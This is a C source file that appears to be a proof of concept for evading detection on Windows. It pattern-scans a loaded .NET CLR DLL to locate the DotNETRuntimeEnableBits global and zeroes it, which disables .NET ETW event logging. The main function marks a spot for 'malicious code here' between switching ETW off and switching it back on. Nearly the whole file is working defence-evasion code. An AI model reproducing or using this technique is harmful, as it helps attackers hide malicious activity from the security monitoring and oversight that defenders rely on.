#include <windows.h>

int getImageSize(void* imageBase) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)imageBase;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)imageBase + dos->e_lfanew);
    int sizeOfImage = nt->OptionalHeader.SizeOfImage;
    return sizeOfImage;
}

int isEtwFunc(unsigned char* funcAddr, void* etwEventWrite) {
    int i = 0;
    while (1) {
        unsigned char* currAddr = funcAddr + i;
        unsigned char currByte = *currAddr;

        if (currByte == 0xc3) {
            return 0;
        }

        unsigned char nextByte = *(currAddr + 1);

        if (currByte != 0xff || nextByte != 0x15) {
            i += 1;
            continue;
        }

        int iatOffset = *(int*)(currAddr + 2);
        unsigned char* rip = (currAddr + 6);
        int* iatAddr = *(int**)(rip + iatOffset);

        if (iatAddr == etwEventWrite) {
            break;
        }

        i += 1;
    }
    return 1;
}

int hasCoTemplateEventDescriptorCall(unsigned char* addr, void* etwEventWrite) {
    // test    cs:Microsoft_Windows_DotNETRuntimeEnableBits, 40000000h (10 bytes)
    // jz      short loc_* (2 bytes)
    // lea     rdx, DebugIPCEventEnd (7 bytes)
    // call    CoTemplateEventDescriptor (5 bytes)

    unsigned char* callInstrAddr = addr + 10 + 2 + 7;
    unsigned char* rip = addr + 10 + 2 + 7 + 5;

    if (*callInstrAddr != 0xe8) { 
        return 0; // not a call
    }    

    int offset = *(DWORD*)(callInstrAddr + 1);
    unsigned char* funcAddr = rip + offset;

    return isEtwFunc(funcAddr, etwEventWrite);
}

int* findDotNETRuntimeEnableBits(HMODULE clrBase) {
    int clrSize = getImageSize(clrBase);

    HMODULE ntdllBase = LoadLibraryA("ntdll.dll");
    void* etwEventWrite = GetProcAddress(ntdllBase, "EtwEventWrite");

    // assuming a max of 20 global variables that match the pattern
    int MAX = 20;
    int* globalVars[20] = { 0 };
    int globalVarCounts[20] = { 0 };

    for (int i = 0; i < clrSize; i++) {
        unsigned char* addr = (unsigned char*)clrBase + i;

        // matches "test cs:Microsoft_Windows_DotNETRuntimeEnableBits, 80000000h"
        if (addr[0] != 0xf7 || addr[1] != 0x5) {
            continue;
        }

        if (*(DWORD*)(addr + 6) != 0x80000000 && *(DWORD*)(addr + 6) != 0x40000000) {
            continue;
        }

        if (!hasCoTemplateEventDescriptorCall(addr, etwEventWrite)) {
            continue;
        }

        // calculating global var address
        unsigned char* rip = addr + 10;
        int offset = *(DWORD*)(addr + 2);
        int* globalVarAddr = (int*)(rip + offset);

        // storing frequency of potential vars that could be Microsoft_Windows_DotNETRuntimeEnableBits
        for (int i = 0; i < MAX; i ++) {
            if (globalVars[i] == 0) {
                globalVars[i] = globalVarAddr;
                globalVarCounts[i] = 1;
                break;
            }

            if (globalVars[i] == globalVarAddr) {
                globalVarCounts[i] += 1;
            }
        }
    }

    // return the most frequent var that is Microsoft_Windows_DotNETRuntimeEnableBits
    int mostFreq = 0;
    for (int i = 1; i < MAX; i ++) {
        if (globalVarCounts[mostFreq] < globalVarCounts[i]) {
            mostFreq = i;
        }
    }

    return globalVars[mostFreq];
}

void turnOffEtw(int* DotNETRuntimeEnableBits_addr, int* DotNETRuntimeEnableBits_val) {
    *DotNETRuntimeEnableBits_val = *DotNETRuntimeEnableBits_addr;
    *DotNETRuntimeEnableBits_addr = 0;
}

void turnOnEtw(int* DotNETRuntimeEnableBits_addr, int DotNETRuntimeEnableBits_val) {
    *DotNETRuntimeEnableBits_addr = DotNETRuntimeEnableBits_val;
}

int main() {
    HMODULE clrBase = LoadLibraryA("C:\\Users\\root\\Desktop\\clrs\\clr_4.8.4220.0.dll");
    int* DotNETRuntimeEnableBits_addr = findDotNETRuntimeEnableBits(clrBase);

    printf("clrBase: %p\n", clrBase);
    printf("DotNETRuntimeEnableBits_addr: %p\n", DotNETRuntimeEnableBits_addr);

    // because the CLR isn't initialized, there will be no DotNETRuntimeEnableBits value.
    int DotNETRuntimeEnableBits_val = 0;
    turnOffEtw(DotNETRuntimeEnableBits_addr, &DotNETRuntimeEnableBits_val);
    // malicious code here
    turnOnEtw(DotNETRuntimeEnableBits_addr, DotNETRuntimeEnableBits_val);
    
    return 0;
}